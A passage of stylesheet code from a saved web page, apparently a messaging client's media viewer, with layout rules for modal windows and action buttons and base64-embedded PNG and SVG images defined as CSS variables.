  overflow: hidden;
}
.media_modal_author_photo .peer_initials {
  line-height: 32px;
}
a.media_modal_author_photo {
  margin: 1px 10px 1px 0;
}
div.media_modal_author_name {
  font-size: 13px;
  margin-top: 1px;
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
.media_modal_date,
a.media_modal_date:hover {
  font-size: 11px;
  color: rgba(255, 255, 255, 0.4);
}
div.media_modal_date {
  margin-top: 2px;
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
.media_modal_wrap .modal-body {
  padding: 16px;
}
.embed_modal_wrap .modal-body {
  line-height: 0;
  padding: 0;
}
.photo_modal_window,
.video_modal_window,
.document_modal_window {
  padding: 0;
}
.video_modal_window .modal-body {
  padding: 0;
}
.media_modal_bottom_actions {
  position: absolute;
  right: 0;
}
.media_modal_action_btn {
  float: left;
  display: block;
  width: 68px;
  height: 64px;
}
.media_modal_action_btn:hover {
  background: rgba(0, 0, 0, 0.2);
}
.media_modal_action_btn i {
  display: block;
  opacity: 0.5;
  background-image: /*savepage-url=../img/icons/PhotoIcons.png*/ url();
  background-repeat: no-repeat;
  background-position: 0 0;
}
.is_2x .media_modal_action_btn i {
  background-image: /*savepage-url=../img/icons/PhotoIcons_2x.png*/ url();
  background-size: 40px 200px;
}
.media_modal_action_btn:hover i {
  opacity: 1;
}
.media_modal_action_btn i.media_modal_action_btn_download {
  background-position: -12px -163px;
  width: 16px;
  height: 20px;
  margin: 22px 26px;
}
.media_modal_action_btn i.media_modal_action_btn_forward {
  background-position: -9px -109px;
  width: 23px;
  height: 15px;
  margin: 24px 22px;
}
.media_modal_action_btn i.media_modal_action_btn_delete {
  background-position: -13px -135px;
  width: 14px;
  height: 18px;
  margin: 23px 27px;
}
</style><style type="text/css">ogvjs { display: inline-block; position: relative; user-select: none; }
</style>
<style id="savepage-cssvariables">
  :root {
    --savepage-url-3: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAO0CAYAAADXsnTIAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAGHVJREFUeNrsnQm4FcWVx+v6HryACIrwZIvgwjIYxQxCRGQEBxIwgiBREHEPoiIKajAxUXEyIS7DoogGiEIQRSCAwODDLRIRjGiQjKIoKK4gKDsPWb1zjn0utE3fe7u6q/o2vH993/+79/X6e9W1nHNuV1UqnU6rJKcjVMITAAEIQABWdMBiv42pVCrviZ1ufqgyffyUv5LOIJ1EOlp2byJ9SHqD9BzpJdKefNd8ftTAYIB081zXYYjBpAGkY7McU0fUljSItI40hjSStN3mI+5NWkm6KwecXzqO9F+kD0gX2gAsIv2JNIVUK0KRqkuaQRoR9N7FAeGm6f7nedJgeQJXk/ZFzcGHDMNl0uWk4VEfcR/SDRZbkZtJ3cMCcm0dFUNT9zCpWhjAW0m1YwCsT7pRF7DExKMtqVyszj7tJNWwTs18hw6Uyhi4Fncm1QwDdcQRKXV64wbqP89o9h1clZJKavnqtWrwg3/NdVo9UgfSi0EBO+mCnVS/turYqqlq/+Mm6tgaR35v3/ufrgtyiU46gK2CXLH0mKNUh39vQrnVVDWqm71jeeWtlUEu11rnEZ+Y60rNGtZR13Q9S512Ur28hsW6jdvUe598GQTwRB3AnOWvS5vmqsXJ9QM9+leWrVQBXe8axuzBSWWvq8VvfxToxguCPV7thnpjrpM2bClXQx+bpwaOmKpeX/5x1uO++GqzWvnZ+qAsW3QAPwpyxQ/o5neOn0ug09TGrTsOzr2lWrn3kQ7gmzpX5mbk6RcPPuXvy7QA39ABfEG3rJS9tlxt2nYgFz9eu+E7aaTndQDLxK8InHbt2atmLlgWtnKsJb2sA7iL9IhuLs559e3vcpFr94KlH+haNPt0LWp2cK7T8T2+2bVb/W7cXFWnZnW15ustQU/7QoxibXNrgxiUWomblYX/WqVzyk25PL18DfWTpIkWbcHRpJlRfZJfkmZZgJsmzlNkt5ML78WkPxvOuT75PDqdvngvqZ94Yl9HAFsr/+xNQeDCGAtPkBqT/qDZTvI/dQ+pOWl65OBRnrSZ9DvS79nyInUUA7eRRB3S0gJkgkcvSC+x21h0K2jnQXpGZC0hgAlAAAIQgAlPxaYu9PyogUPFwD2d9Imp66YMvhLwPqmJWMfNxJRPFCD/8sSu3PFiUDSOaJoZB+TEsWZ2SI4TuBOU5i9LtgE5VSetVk6EbI1A7k4SoBK7cLXk6Eal97NZ7M1MKsrJNgA511bIJz/iOkkCrCY1+VipJE2jlD/TgNzMLJcc42bm36LWYNOAb0sbyFA/MtEGmgbkSAFHjE4z1YvYbGZgbgEQgAAEILy6YCloN5QqVA6mbMKZesQpW3Amy2DKBpzpSpIyDWc09GEaDO0gAAEIQAAepuaWKS8/VWFzMIUyCEDUYtRiVBIAohajFqOSABCAAATgIdyT7E/9R87k8Z88PvhS+UcnkW5TzuvLodLYwRcGA6SbB7keww1w/c0jXPn190FJecSX+mzr6/p+Muk15UxfsEjlGe1oA/CIPOYYv/d/pjyls0iPxw34hM+2Sa7vZ3j2tY61kihnBDfn2GXy+RfSb1z7l0jOZdI/4s5Brq08sprHwh8jlcP9GtTlUva4DC5UzpQFseZgvsTDNc4uRC3md7P4Zdo5ynmZdrfk0mzSUYVsqH9Aul85Y+0qefYtVc4YpXLlTJdxpXLGyZ8qRYBH7/C7XfNJE5QzOYlxQK4EF+eoMAzHk5U8Rqrq2c+vi54jupN0lXLe9TL6iHvm2PdqprfygfMm3j/ORhksyrFvr3xWD3itGhXSmrH+fgIMVgACEIAArACAPcRUSocUz0xygU1Anl6tNEKG1NaxZMIAlhp4aqWFKIM7lTMNVnUxpW6MEgKx4TTdQnrU9fcYsWxGJ6UWTw7o2BcMMPFvYF7ms+2KJJXB4ZJjT8jnFeKiJgawRCrEaGU4mQx9cE+RGWhVKyllcIf0DJ0k7FEqOkq2jZNjCgL4unLGE/dXzqx35a595bKN9/HgvyWFAOylgg1P+zxHyMQq4CeWjjVWSWIZkKebg18ZuOc6m4DXitEZBa6fzUdsfQIcOE0ABCAAAVhBAe9QB8dhhiQJ8DSfbacmCfDkgNusA/Lxi5UzZd8vSD8UV/PHPsfylH8TlTPn+cXiAryi60zpWjP8K2Ub+d5Rylq2GxaJf3y55xh28ifZyEGOXA0LEd7wHnOvyjHNfRTA36rcsb33SP8jUYb3cxzHP3j/2gYg/2KeLebHM9HyDCm/Us7rUacoJwTnl3bKtYwDcoitHekzn5zj+VS/dW3jV6Ru9slJ9u74RYuptmoxT7o51rNtngfODTnPs42DnP+Mux20+m61LiA3Mdd7tp2v/F8X4Casq2cbvy3X2hYgt2kLpOF1J469POiBZDgOxTX2HPtDaawvtdFQ84RzlbPsGyANd6bMdfWBy6QS+aeMA3IjfaXKPo9W04A35oDTfTYe8TYxq3TjM95juJEut1VJJkoZ4kndu0t5fFz5z4zM79KMk56DX07l16J4YvYnbRoLnBvneLZdQ2pBaunZzhP195fvs1TISbdN2YMrA24rGOAyecxuLTNxYVNR/vt0aia8OgACEIAABOD+xAYs/6j4lHIWbGQzart855DIRVF7qygnc7zlj8p/IEtjUV8xGthfnh1XDhaJ+zhVBRtl01hMrWFhPMAwgA8o531+XdeUx5qMsg3YWwVYlSVH4nVJrL39xqMhhmsc/41yYoled+BenbKvA8g1sl6eY/aIv8IxQZ7Vm9eOfdvHfb3ARi3Otr4mx2V4aBAv28qrt7jnAObXU07xOYedqBmmAVv7PMKhAvZZjjJbyWd7Cxs5WNfz9+cS8sj1nmCfLNvr2CiDaZ/2jcvXVVlyidvIM3MUC+OAX2RphB+Xru1cz75LcjTMX9oAXJRjXyPlrM5WFODxcnrdBuCcPPubSqXgxOtDNM9x7FwbgDym98M8x/DS1SXSDmZL76qDQ8NGajE3wrcJaLay1UTKY/0cFW2ICrgMV5i+mN+Zyfdm5fEq+wiy+3RyL6w1c4e0f0qzibpfHRxftALIbRiPhOUfE4O81cbrcXJI+HYV4oW0KBb1DKnZ3UUtxEDItHPLpLxyjd1bCJM/U3GmK80l3uDVARCAAATgYQSo1ZOMHXwhj6uLMnSN38Pm15QDB5J0V3hZp6IPXVvv6rONA2L2PAACEIAJAdwmTtWOJAD6vSx2tThVAyJfnRtqDXnTs6Qi0lTXtuGecyb6nBf4nlEAV5NqyvYqpDdIr5CKPedUJS0PCxi2q+O3KDlAvtS1r5449X6xP4508buHVXW7urA5eI3meawr48zBxBoLiR9X10/FPK4OSxICEIAABCAA4wXUmfPIbWCE7q5sxmZSPhZQyjagzsGpLOekkl4G04dVJSmO4R6JW8f9kMnBdCF8EvQkAAQgAC0DHvahj80KoQ8AAhCAAARg4n2SdB7HPJ8Dn6rwOagbIUijkuQoWymDx6EMogyiDKIMogyiDKIMogyGyAXEZgAIQAACEICJAOR5QHgQ/lbSFtLDyhlKHj2FeJvXT4/4vMw92sS1TfXFnHPehW05J49OirGQzmFqJbaSpFGLD/ccxCPOlXhaguc8zYw3bXJ9/5tyZviJDXCFcmZEyUyZkWvR+Upy7Ltx9iR3SW9xhfxdIj3HZtIm0ihSZdnXT469Pcy9wgLWIK0hbSG1znHcWaRtpE9J1eIEZLWRm+8k/TepkWvfiaR7Sbvkn2gV9j5RO/NTSctcBgLDbHX9vZR0SpR7mLBkjiB1Iz0uUN+SxpPOJ6WSYs1kImU8Ock+ZfC9RJj8CB4BEIAABCAAC5sideqTJ08+RjlTSXZRznJcPPnmbuVM4LlKOXOyTvH4J1lT3759gwHSjYNEs3jK3SE+8ReeArqZiFd/+YNy5g8eGcZxCvOIGylnQP0wgePJ53i+y4YCzgtONZdtc+UYhlwi51p9xA1IC12fPK/vs55jeF7W90RT5PHzTMrt5Jw2UgSM5yDnzkyB45w5zwfOL5XJsXPlXL5GFRuAPCkir6DG647wJJzbNc7dLue8KdcYZBqwpjqwvtdQ5bxRrpv4nLvl++1yTWOA3JTUUM6Mje5JNnmyEZ4Z5Qafc/z2PSvXqCHXNAb4M/mc4tn+e+Us7TbU55xs+zLX6GwS8HT5XGygc8hco4VJwMxEXt6hFnfKY7zH55xs+9Z5rmmkHdwlPUSJ+v7802NU9nXpcu0z3pOslc+6fp6h5j2zPY1IgJmF8byrS3KN/JTUweccno9mtTp4Seuz5PNfJgGfczU33txoIPuHS2Viq4bXTnxJ+t66Pk0Wp/kmAblp4F+Oukm3td9CErOKo6i3kN6SnLlVyivvu8x1/HlyjS0+TVYkwI3qwDpMv5F+mdNKyTVekZJnj+LVNXgqK55q6C7Z94GrL8/0RvfJNY1aM6Pk8fCijE8rZ1G8ctEwdfCanu7EDfaTYtG8ozTWiNAxFtjY5An/1yhnZYIyMaXypS7SxfGj5Ynfe+gYrrr24CrJwTmSG+3EjHpKeojMjFF1pLay0ZpZN/Ed+f6xbZ+Em47WYvL/Sm7aNY8VE9rkD+s0fSNl7lHJpc7SvNR1Nez/J03JU0GdJuNendzYSJcGxx2AAAQgAA9RwEg9yfh9nc3GB/0cHr+fws75y9dBAknZ4oOhjYW/X1HLyCNmPwPxwTA5iPhgFEDEB6MCIj4YFbBg8cGgPUnmLd8ayv9VPJ3EMZud0iWWmOpJEB+MCliw+GDQMsiN6kdSBn/u6uIay/eTc8Ry+PhMCO48aUc5PshLFm40VQYLFh/UsQe5g+elBE9VzgIomfhgkJSJD3aTKFdrP9swqj2I+KApnwTxQWNenUJ8EIAABCAAARh5UEC/ovlDXLaiNw2RfjhgCvj+IN006BWvyQGXMUx55tGJcTxivxnl/5zPICZN8JyzXuxJ44BRliJ0p9qkcTYASw2W/dK4a/EMsa6riP6DNCspzQy/gsILly0SP5hj1a+K/zKk0ICccyPEP+ZIAcelV4jbeaI0MbMLCThKrjFD3NFMYn94mtTiEYUE5JhzEw9cJrUknSDHFLQMWh0UFRWwlYQ2lvnsWyIuaqtCAg6WHOypvr/yH8P1kn23FtJY6CHO+wOSUye4nPu0BIu6FroM3q+cIGU7CX18KQ01h0f+WHBzS9IFOgaArRz8yuB919kAjDphuxuun41HPDtqtwWnCYAABCAAEZs5OE3Y0c5YbKZvUEC6KWIziM0gNoPYDGIziM0gNoPYDGIziM0gNgOnCYAABCAAK1ps5qqqC3toOPAhFtJrGAyQQGxEF9IqxBTkuo84anQhfSiUwXTFrSQhU6Sp7yt0DqZN5Cp6EgACEIAJAzQR/lhnEzBq+GOz0gh7hOlJYg9/oJIAEIAABODh5JNM2NHOaujDxGspCH0koQwi9KGbEPqwUdYQ+gAgAAF4qAIi9BG1J0HoA4AABCAAAWjJJ+la48N0dG8u4FsfdDM8YgACEIAABCD64ryxZgN9c7QcTFk61ugjTtmEM1UGU7bgTFaSlA0407U4ZRrOqEVtGgwNNQABCEAAVkB7MJU0exCPGIAABCAAAQhAWDORfOAUHjEAAQhAAALQN/nNhemV2zdOxw0YZshGOk7AKONJEl8G04ddJbE9XCMxvzQdcjmYNpWr6EkACMCKCBhlRMS6OADDjojQHgkRtqGOdUQEKgkAAQhAAB6uJv+gXufG8ot7Kp0O7fTjlQAAAhCAAAQgACsAYBRjATkIQAACEIAADA9YRmqeZMDOylnhbwypllVC7otDyJ02kG4gFYe8Vk6FNRb8TnpXOUu/zU9qJWkuZdNo+bRRi42WT5OP2C99TbpbOUux7k0iYOTyWeF7Ev597iZSi7C129ZLFXul3N0t5TB0sgE4X8rbuyYuZhIwsQ01l7NBUcqZrb54D2kMqZaNPjij4iSUM0QWAAhAAAIQgPZSJGum/8iZJcpZbby7chaWryu71ipngflZpOmkXUGuN3bwhcEA6cZBrtebNJxUz2ff8SK+472kW0jT4nrEfM6jpClZ4LypPmkq6eEw9wsDyP7udT7G6vmkI0nVSN1IKzzHDCA9ZBuwdxa4NqR5pB2kctJc0plZIC+yBVgiZc6bhpC2Snnj10f57Uxe030L6Xaf40eQKtsA7JWlzL2cqYQS6qgtHh2nv/kc30AnF3UAu2fZXi6RBncc5lv5LNK8ViTAlho+8fXyvU+WY86wAVg3wDH7SJeQniGdTXogy3H1bDYzuRID/VVyu0yandj64rUBjslUjlHSHmZLX9gAfDPAMavl8ycGrqUNOCtIHEBUycC1tAGn6zyaHOlT0gwbgLvEKskZCFD53xMcTNptqxZPE2MhbGJjYaatWpxJN+WAzDXY9EHJPevmFndjN5IuJn0esMz1VE6I7ts4TX6uNLOl4+8u3Vc9VzuXMfln6JQ5oz6J3PhJEdxOAAIQgACsiICRf6vr2aF1Wkz9/h6jQSkDg/CLs9xU5xoMd618768iTp1hPAddOXetK9fSSQBMeyxpK5Cmfi9OZ4FMDGA2yP5JArQCaeOdBaOQpud+S5uGtDFpezbIUIA2urqUTzuZSlIZNNbEwJoBIAABCMCK4DQdWf6JQaepQTBAuimcJjhNcJrgNMFpgtMEpwnWDAABCEAAHhJOU9u2ba3+0mRiYNRYGYQ11mdwdMEGXcFpgtMEpwlO0+HiNNka22n3nQU4TQAEIAABCEA7PcnkyZMbK2esZkdSdc178di7F0m/Jq30O6Bv377BAAnEb3NT0j9IR4fMDP6HeHDgucoZtfi+6Uc8TOB40Olx6sDYkaA6Ts49Wq5lvAx2lE8e1RBm8Yr1ci6nn9oArO66UdiUObdaXLV4oTowyGVhgO2xNzNna35HQ+1Nr7q+LwqwPXaTv53mdjxi1GLUYtTiPPYcp9II98ucu90G4IvyOSokZKmcy+l5G4/4t2JsXiIKmzbLtYzn4AqxhHl88LYQYNvkXL85QIxVEjbTe8KrAyAAAQhAAIbrScbv62w3uhUUkED8NiO6FRUQ0S34xfCL4RfjEaMWoxajFue15zghuhX2ESO6ZaKSILoFQAACEIAAjNCT9CuabzW65RffKs4C4rcZ0a2ogIhuxVmLx4lPXJbEZobXDLtaOdPf35pEQF5agRcM+JMysFSXacALpBnZRBqatJ6EJ2rPLBRwD2lD0gB5Eu3G4hA9krS++FjSXfL9NtKepAEOlR6CHfJ5SbNmeJ3Y60w1KzYAh4vRwY3zOwU1t7KkLkkxWBHdivqIEd0yUUkQ3QIgAAEIQABG6Enw7lbER4zoVlRARLfiAkR0K0pCdCtKQnQrShqqEN0KnxDd0rHnOCG6FfYRI7plopIgugVAAAIQgAA0bG7dUeefRRLK6Cg+SUp6nJfEKNgX/Go/CwZINw16xT5isNbxbD9frOsvlbO0+pRCPOLHlLM0NcPtEthMJKs3aafse4o0Pu5H/JCENzjxyuI8+uEN0vXyT/My6qtIS+TvX5LK1YHoltUc5CDkQNffYwTuZfGHHyYtIHE5Ge067mblrFZuHbCb52+OunI4ra1rWxvZtsQnNGIdcLbn71biYyx2bVss236S51wrgLx4/IOuv/lxtyS1Jw0g3UDqIOA3uo4bSXomrkrChf1IKfzcDvIYpqtcMRn2WSa4MmCcNDexNjP9BGQt6QfS1mXG0nHTUkJaI01OQaZ75vQ0aRqpk/QkTV0OFvckL0gzVNDIAgM8J4I1A0AAAhCAcJo001f7ahh0mgIC0k3hNMFpgtMEpwlOE5ymYMnWEjSwZgAIQAACEE5ThLRgwQJ+Ve9RyYDr2rdvvzsxXZ3AsbHwC5d5dglB7ir4Iya4yh44Tj3Y0qF9VQoKmAXODTku9jJIUA3po6s47C09fok3FcUKSHAX0ccTYpjmS/8rBm6sj5i9uaUBjptLuogqSXnstZhykV8LnaGcl8780hxSL4LbWbBmhiCbiZNe1bPrNfbuwjYvRmoxwXHsZZLAed/8XRYVLhKgwJWJ/8tl8UxxlDJpVcH6YoKrTx88Kc3ppLdIP6fcWipxm0Xies4qpLEwXTmjHhiqC8FxHFDR51aB5Fq72gRgqEpCOTiRPo5np5xA1iuLCX4xAAEIQAACMIF+cdk767/nF3f5UWly/GKBO8gvJsjC+8UEl9Uvpn2F9YuzwBXWLyao5PrFBHd4+cVUSeL3iykXA/nFBFc4v5ggc/rFYZsXI7WY4HL6xVHhIgEKXDL9YoI7yC+m3EquX0xw3/nF9LnfL6bvhfOLKQf3+8UEAr8YgAAEIAABCEAAAhCAAExs+n8BBgBNyR/uzgXQFAAAAABJRU5ErkJggg==);
    --savepage-url-4: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2MiAxNCI+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTMyLjQ2My0xMTguNjcpIiBmaWxsPSIjZmZmIj48cGF0aCBkPSJtMzIuNDYzIDExOC42N2g4LjY1NnYxLjYxN2gtMy40djkuMDhoLTEuODcydi05LjA4aC0zLjM4NXYtMS42MTciLz48cGF0aCBkPSJtNDUuNzgzIDEyNC44MWMtLjAyLS4yNy0uMDgtLjUyOS0uMTgtLjc3OS0uMDktLjI1LS4yMi0uNDY0LS4zODktLjY0NC0uMTYtLjE5LS4zNTktLjMzOS0uNTk5LS40NDktLjIzLS4xMi0uNDg5LS4xOC0uNzc5LS4xOC0uMyAwLS41NzQuMDU1LS44MjQuMTY1LS4yNC4xLS40NDkuMjQ1LS42MjkuNDM0LS4xNy4xOC0uMzEuMzk0LS40MTkuNjQ0LS4xLjI1LS4xNTUuNTE5LS4xNjUuODA5aDMuOTg0bS0zLjk4NCAxLjEyM2MwIC4zLjA0LjU4OS4xMi44NjkuMDkuMjguMjIuNTI0LjM4OS43MzRzLjM4NC4zNzkuNjQ0LjUwOWMuMjYuMTIuNTY5LjE4LjkyOS4xOC40OTkgMCAuODk5LS4xMDUgMS4xOTgtLjMxNC4zMDktLjIyLjUzOS0uNTQ0LjY4OS0uOTczaDEuNjE3Yy0uMDkuNDE5LS4yNDUuNzk0LS40NjQgMS4xMjMtLjIyLjMyOS0uNDg0LjYwOS0uNzk0LjgzOS0uMzEuMjItLjY1OS4zODQtMS4wNDguNDk0LS4zNzkuMTItLjc3OS4xOC0xLjE5OC4xOC0uNjA5IDAtMS4xNDgtLjEtMS42MTctLjMtLjQ2OS0uMi0uODY5LS40NzktMS4xOTgtLjgzOS0uMzE5LS4zNTktLjU2NC0uNzg5LS43MzQtMS4yODgtLjE2LS40OTktLjI0LTEuMDQ4LS4yNC0xLjY0NyAwLS41NDkuMDg1LTEuMDY4LjI1NS0xLjU1OC4xOC0uNDk5LjQyOS0uOTM0Ljc0OS0xLjMwMy4zMjktLjM3OS43MjQtLjY3OSAxLjE4My0uODk5LjQ1OS0uMjIuOTc4LS4zMjkgMS41NTctLjMyOS42MDkgMCAxLjE1My4xMyAxLjYzMi4zODkuNDg5LjI1Ljg5NC41ODQgMS4yMTMgMSAuMzE5LjQxOS41NDkuOTA0LjY4OSAxLjQ1My4xNS41MzkuMTkgMS4wOTguMTIgMS42NzdoLTUuNjkxIi8+PHBhdGggZD0ibTQ4Ljg0OCAxMTguNjdoMS43MDd2MTAuNjkzaC0xLjcwN3YtMTAuNjkzIi8+PHBhdGggZD0ibTU3LjcxNyAxMjQuODFjLS4wMi0uMjctLjA4LS41MjktLjE4LS43NzktLjA5LS4yNS0uMjItLjQ2NC0uMzg5LS42NDQtLjE2LS4xOS0uMzU5LS4zMzktLjU5OS0uNDQ5LS4yMy0uMTItLjQ4OS0uMTgtLjc3OS0uMTgtLjMgMC0uNTc0LjA1NS0uODI0LjE2NS0uMjQuMS0uNDQ5LjI0NS0uNjI5LjQzNC0uMTcuMTgtLjMxLjM5NC0uNDE5LjY0NC0uMS4yNS0uMTU1LjUxOS0uMTY1LjgwOWgzLjk4NG0tMy45ODQgMS4xMjNjMCAuMy4wNC41ODkuMTIuODY5LjA5LjI4LjIyLjUyNC4zODkuNzM0cy4zODQuMzc5LjY0NC41MDljLjI2LjEyLjU2OS4xOC45MjkuMTguNDk5IDAgLjg5OS0uMTA1IDEuMTk4LS4zMTQuMzA5LS4yMi41MzktLjU0NC42ODktLjk3M2gxLjYxN2MtLjA5LjQxOS0uMjQ1Ljc5NC0uNDY0IDEuMTIzLS4yMi4zMjktLjQ4NC42MDktLjc5NC44MzktLjMxLjIyLS42NTkuMzg0LTEuMDQ4LjQ5NC0uMzc5LjEyLS43NzkuMTgtMS4xOTguMTgtLjYwOSAwLTEuMTQ4LS4xLTEuNjE3LS4zLS40NjktLjItLjg2OS0uNDc5LTEuMTk4LS44MzktLjMxOS0uMzU5LS41NjQtLjc4OS0uNzM0LTEuMjg4LS4xNi0uNDk5LS4yNC0xLjA0OC0uMjQtMS42NDcgMC0uNTQ5LjA4NS0xLjA2OC4yNTUtMS41NTguMTgtLjQ5OS40MjktLjkzNC43NDktMS4zMDMuMzI5LS4zNzkuNzI0LS42NzkgMS4xODMtLjg5OS40NTktLjIyLjk3OC0uMzI5IDEuNTU3LS4zMjkuNjA5IDAgMS4xNTMuMTMgMS42MzIuMzg5LjQ4OS4yNS44OTQuNTg0IDEuMjEzIDEgLjMxOS40MTkuNTQ5LjkwNC42ODkgMS40NTMuMTUuNTM5LjE5IDEuMDk4LjEyIDEuNjc3aC01LjY5MSIvPjxwYXRoIGQ9Im02Ny44OTYgMTI4Ljk2YzAgMS4xNjgtLjMyOSAyLjAzNy0uOTg4IDIuNjA2LS42NDkuNTc5LTEuNTg4Ljg2OS0yLjgxNi44NjktLjM4OSAwLS43ODQtLjA0LTEuMTgzLS4xMi0uMzg5LS4wOC0uNzQ5LS4yMTUtMS4wNzgtLjQwNC0uMzE5LS4xOS0uNTg5LS40MzktLjgwOS0uNzQ5LS4yMi0uMzEtLjM0OS0uNjg5LS4zODktMS4xMzhoMS43MDdjLjA1LjI0LjEzNS40MzQuMjU1LjU4NC4xMi4xNS4yNi4yNjUuNDE5LjM0NC4xNy4wOS4zNTQuMTQ1LjU1NC4xNjUuMi4wMy40MDkuMDQ1LjYyOS4wNDUuNjg5IDAgMS4xOTMtLjE3IDEuNTEzLS41MDkuMzE5LS4zMzkuNDc5LS44MjkuNDc5LTEuNDY4di0xLjE4M2gtLjAzYy0uMjQuNDI5LS41NjkuNzY0LS45ODggMS0uNDA5LjI0LS44NTQuMzU5LTEuMzMzLjM1OS0uNjE5IDAtMS4xNDgtLjEwNS0xLjU4Ny0uMzE1LS40MjktLjIyLS43ODktLjUxNC0xLjA3OC0uODg0LS4yOC0uMzc5LS40ODQtLjgxNC0uNjE0LTEuMzAzLS4xMy0uNDg5LS4xOTUtMS4wMTMtLjE5NS0xLjU3MyAwLS41MTkuMDgtMS4wMTMuMjQtMS40ODMuMTYtLjQ2OS4zODktLjg3OS42ODktMS4yMjguMy0uMzU5LjY2NC0uNjQ0IDEuMDkzLS44NTQuNDM5LS4yMS45MzQtLjMxNCAxLjQ4My0uMzE0LjQ4OSAwIC45MzkuMTA1IDEuMzQ4LjMxNC40MDkuMi43MjQuNTE5Ljk0NC45NThoLjAzdi0xLjA2M2gxLjcwN3Y3LjMzOG0tMy43ODktLjk0NGMuMzc5IDAgLjY5OS0uMDc1Ljk1OC0uMjI1LjI3LS4xNi40ODQtLjM2NC42NDQtLjYxNC4xNy0uMjYuMjktLjU0OS4zNTktLjg2OS4wOC0uMzI5LjEyLS42NTkuMTItLjk4OCAwLS4zMjktLjA0LS42NDktLjEyLS45NTgtLjA4LS4zMDktLjIwNS0uNTg0LS4zNzQtLjgyNC0uMTYtLjI0LS4zNzQtLjQyOS0uNjQ0LS41NjktLjI2LS4xNC0uNTc0LS4yMS0uOTQ0LS4yMS0uMzc5IDAtLjY5OS4wOC0uOTU4LjI0LS4yNi4xNi0uNDY5LjM2OS0uNjI5LjYyOS0uMTYuMjUtLjI3NS41MzktLjM0NC44NjktLjA3LjMyLS4xMDUuNjM5LS4xMDUuOTU4IDAgLjMyLjA0LjYzNC4xMi45NDQuMDguMy4yLjU2OS4zNTkuODA5LjE3LjI0LjM3OS40MzQuNjI5LjU4NC4yNi4xNS41NjkuMjI1LjkyOS4yMjUiLz48cGF0aCBkPSJtNjkuNjMgMTIxLjYyaDEuNjAzdjEuNDk4aC4wM2MuMDUtLjIxLjE0NS0uNDE0LjI4NS0uNjE0LjE1LS4yLjMyNC0uMzc5LjUyNC0uNTM5LjIxLS4xNy40MzktLjMwNS42ODktLjQwNC4yNS0uMS41MDQtLjE1Ljc2NC0uMTUuMiAwIC4zMzQuMDA1LjQwNC4wMTUuMDguMDEuMTYuMDIuMjQuMDN2MS42NDdjLS4xMi0uMDItLjI0NS0uMDM1LS4zNzQtLjA0NS0uMTItLjAyLS4yNC0uMDMtLjM1OS0uMDMtLjI5IDAtLjU2NC4wNi0uODI0LjE4LS4yNS4xMS0uNDY5LjI4LS42NTkuNTA5LS4xOS4yMi0uMzM5LjQ5NC0uNDQ5LjgyNC0uMTEuMzI5LS4xNjUuNzA5LS4xNjUgMS4xMzh2My42ODRoLTEuNzA3di03Ljc0MyIvPjxwYXRoIGQ9Im04MS4zOCAxMjcuNjVjMCAuMjEuMDI1LjM1OS4wNzUuNDQ5LjA2LjA5LjE3LjEzNS4zMjkuMTM1aC4xOGMuMDcgMCAuMTUtLjAxLjI0LS4wM3YxLjE4M2MtLjA2LjAyLS4xNC4wNC0uMjQuMDYtLjA5LjAzLS4xODUuMDU1LS4yODUuMDc1LS4xLjAyLS4yLjAzNS0uMy4wNDUtLjEuMDEtLjE4NS4wMTUtLjI1NS4wMTUtLjM0OSAwLS42MzktLjA3LS44NjktLjIxLS4yMy0uMTQtLjM3OS0uMzg0LS40NDktLjczNC0uMzM5LjMyOS0uNzU5LjU2OS0xLjI1OC43MTktLjQ4OS4xNS0uOTYzLjIyNS0xLjQyMy4yMjUtLjM0OSAwLS42ODQtLjA1LTEtLjE1LS4zMi0uMDktLjYwNC0uMjI1LS44NTQtLjQwNC0uMjQtLjE5LS40MzQtLjQyNC0uNTg0LS43MDQtLjE0LS4yOS0uMjEtLjYyNC0uMjEtMSAwLS40NzkuMDg1LS44NjkuMjU1LTEuMTY4LjE4LS4zLjQwOS0uNTM0LjY4OS0uNzA0LjI5LS4xNy42MDktLjI5Ljk1OC0uMzU5LjM1OS0uMDguNzE5LS4xNCAxLjA3OC0uMTguMzA5LS4wNi42MDQtLjEuODg0LS4xMi4yOC0uMDMuNTI0LS4wNzUuNzM0LS4xMzUuMjItLjA2LjM4OS0uMTUuNTA5LS4yNy4xMy0uMTMuMTk1LS4zMTkuMTk1LS41NjkgMC0uMjItLjA1NS0uMzk5LS4xNjUtLjUzOS0uMS0uMTQtLjIzLS4yNDUtLjM4OS0uMzE0LS4xNS0uMDgtLjMyLS4xMy0uNTA5LS4xNS0uMTktLjAzLS4zNjktLjA0NS0uNTM5LS4wNDUtLjQ3OSAwLS44NzQuMS0xLjE4My4zLS4zMS4yLS40ODQuNTA5LS41MjQuOTI5aC0xLjcwN2MuMDMtLjQ5OS4xNS0uOTE0LjM1OS0xLjI0My4yMS0uMzI5LjQ3NC0uNTk0Ljc5NC0uNzk0LjMyOS0uMi42OTktLjMzOSAxLjEwOC0uNDE5LjQwOS0uMDguODI5LS4xMiAxLjI1OC0uMTIuMzc5IDAgLjc1NC4wNCAxLjEyMy4xMi4zNjkuMDguNjk5LjIxLjk4OC4zODkuMy4xOC41MzkuNDE0LjcxOS43MDQuMTguMjguMjcuNjI0LjI3IDEuMDMzdjMuOTg0bS0xLjcwNy0yLjE1N2MtLjI2LjE3LS41NzkuMjc1LS45NTguMzE0LS4zNzkuMDMtLjc1OS4wOC0xLjEzOC4xNS0uMTguMDMtLjM1NC4wNzUtLjUyNC4xMzUtLjE3LjA1LS4zMi4xMjUtLjQ0OS4yMjUtLjEzLjA5LS4yMzUuMjE1LS4zMTQuMzc0LS4wNy4xNS0uMTA1LjMzNC0uMTA1LjU1NCAwIC4xOS4wNTUuMzQ5LjE2NS40NzkuMTEuMTMuMjQuMjM1LjM4OS4zMTUuMTYuMDcuMzI5LjEyLjUwOS4xNS4xOS4wMy4zNTkuMDQ1LjUwOS4wNDUuMTkgMCAuMzk0LS4wMjUuNjE0LS4wNzVzLjQyNC0uMTM1LjYxNC0uMjU1Yy4yLS4xMi4zNjQtLjI3LjQ5NC0uNDQ5LjEzLS4xOS4xOTUtLjQxOS4xOTUtLj